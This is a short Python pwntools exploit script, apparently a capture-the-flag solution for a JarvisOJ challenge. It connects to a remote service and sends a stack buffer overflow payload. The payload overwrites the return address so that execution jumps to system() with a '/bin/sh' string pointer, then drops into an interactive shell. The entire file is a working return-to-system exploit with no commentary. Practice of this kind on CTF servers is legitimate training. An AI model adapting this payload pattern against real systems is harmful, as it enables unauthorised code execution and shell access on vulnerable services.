from pwn import *

sh = remote('pwn2.jarvisoj.com', 9876)

sys_addr = 0x80485bd
shell_addr = 0x80487e0

payload = 'a' * (0x13 + 0x4) + p32(sys_addr) + p32(0x8048677) + p32(shell_addr)

sh.recvuntil('> ')
sh.sendline(payload)

sh.recvuntil('failed!!\n')

sh.interactive()